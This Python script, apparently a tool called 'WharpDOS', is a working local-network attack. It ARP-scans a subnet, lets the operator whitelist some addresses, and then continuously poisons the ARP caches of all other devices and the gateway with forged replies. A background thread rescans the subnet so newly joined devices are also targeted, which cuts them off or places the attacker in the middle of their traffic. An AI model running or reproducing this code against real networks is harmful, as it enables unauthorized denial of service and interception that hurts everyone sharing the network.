#!/usr/bin/env python3
from scapy.all import *
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from prompt_toolkit import PromptSession
from prompt_toolkit.validation import Validator, ValidationError
from colorama import Fore, Style
import socket
import netifaces
import pyfiglet
import time
import sys
import threading

console = Console()
prompt = PromptSession()

class NumberValidator(Validator):
    def __init__(self, max_value):
        self.max_value = max_value

    def validate(self, document):
        if not document.text.isdigit():
            raise ValidationError(message="Please enter a number.")
        value = int(document.text)
        if value < 1 or value > self.max_value:
            raise ValidationError(message=f"Enter a number between 1 and {self.max_value}.")

def display_banner():
    banner = pyfiglet.figlet_format("WharpDOS", font="slant")
    console.print(f"[bold cyan]{banner}[/]")
    console.print("[bold green]Created by Ron Vincent Cada[/]\n")

def get_gateway_ip(interface):
    try:
        gateway_ip = netifaces.gateways()['default'][netifaces.AF_INET][0]
        return gateway_ip
    except Exception as e:
        console.print(f"[bold red]❌ Error detecting gateway: {e}[/]")
        return None

def scan_network(interface):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="192.168.110.0/24"),
                 timeout=2, iface=interface, verbose=False)
    devices = []
    for _, rcv in ans:
        try:
            hostname = socket.getfqdn(rcv.psrc)
            name = hostname if hostname != rcv.psrc else "Unknown"
        except:
            name = "Unknown"
        devices.append({"ip": rcv.psrc, "mac": rcv.hwsrc, "name": name})
    return devices

def display_devices(devices):
    table = Table(title="Detected Devices", show_header=True, header_style="bold magenta")
    table.add_column("No.", style="dim", width=4)
    table.add_column("IP Address", style="green")
    table.add_column("MAC Address")
    table.add_column("Device Name", style="cyan")
    for i, dev in enumerate(devices, 1):
        table.add_row(str(i), dev["ip"], dev["mac"], dev["name"])
    console.print(table)

def get_whitelist():
    whitelist = []
    console.print("[cyan][?] Enter IPs to whitelist (press Enter twice to finish):[/]")
    while True:
        ip = prompt.prompt("IP: ").strip()
        if ip == "":
            break
        whitelist.append(ip)
    return whitelist

def find_gateway_mac(gateway_ip, interface):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=gateway_ip),
                 timeout=2, iface=interface, verbose=False)
    if not ans:
        console.print(f"[bold red]❌ Could not find gateway MAC for {gateway_ip}.[/]")
        sys.exit(1)
    return ans[0][1].hwsrc

# Shared state
spoof_targets = []
stop_event = threading.Event()

def update_targets(devices, whitelist):
    return [dev for dev in devices if dev["ip"] not in whitelist]

def monitor_network(interface, whitelist, refresh_interval=10):
    global spoof_targets
    while not stop_event.is_set():
        updated_devices = scan_network(interface)
        updated_targets = update_targets(updated_devices, whitelist)

        updated_ips = set(dev["ip"] for dev in updated_targets)
        current_ips = set(dev["ip"] for dev in spoof_targets)

        if updated_ips != current_ips:
            spoof_targets = updated_targets
            console.print("[yellow][~] Network changed. Updated target list.[/]")
        time.sleep(refresh_interval)

def continuous_spoof(gateway_ip, gateway_mac, interface):
    try:
        while not stop_event.is_set():
            for dev in spoof_targets:
                sendp(Ether(dst=dev["mac"]) / ARP(op=2, pdst=dev["ip"],
                                                  psrc=gateway_ip, hwdst=dev["mac"]),
                      iface=interface, verbose=False)
                sendp(Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip,
                                                   psrc=dev["ip"], hwdst=gateway_mac),
                      iface=interface, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        pass
    finally:
        console.print(f"[yellow]\nRestoring ARP tables before exit...[/]")
        for dev in spoof_targets:
            sendp(Ether(dst=dev["mac"]) / ARP(op=2, pdst=dev["ip"], psrc=gateway_ip,
                                              hwdst=dev["mac"], hwsrc=gateway_mac),
                  count=5, iface=interface, verbose=False)
            sendp(Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, psrc=dev["ip"],
                                               hwdst=gateway_mac, hwsrc=dev["mac"]),
                  count=5, iface=interface, verbose=False)

def main():
    if len(sys.argv) != 2:
        console.print(f"[bold red]Usage: {sys.argv[0]} <interface>[/]")
        sys.exit(1)

    interface = sys.argv[1]
    display_banner()

    gateway_ip = get_gateway_ip(interface)
    if not gateway_ip:
        gateway_ip = prompt.prompt("[cyan][?] Enter gateway IP manually:[/] ")

    initial_devices = scan_network(interface)
    if not initial_devices:
        console.print(f"[bold red]❌ No devices found on {interface}.[/]")
        sys.exit(1)

    display_devices(initial_devices)
    whitelist = get_whitelist()
    console.print(f"[bold green]✅ Whitelisted IPs: {whitelist}[/]")

    global spoof_targets
    spoof_targets = update_targets(initial_devices, whitelist)

    gateway_mac = find_gateway_mac(gateway_ip, interface)

    # Start background scanner thread
    scanner_thread = threading.Thread(target=monitor_network, args=(interface, whitelist), daemon=True)
    scanner_thread.start()

    try:
        continuous_spoof(gateway_ip, gateway_mac, interface)
    except KeyboardInterrupt:
        stop_event.set()
        scanner_thread.join()
        console.print("\n[bold yellow]⛔ Exiting...[/]")

if __name__ == "__main__":
    main()
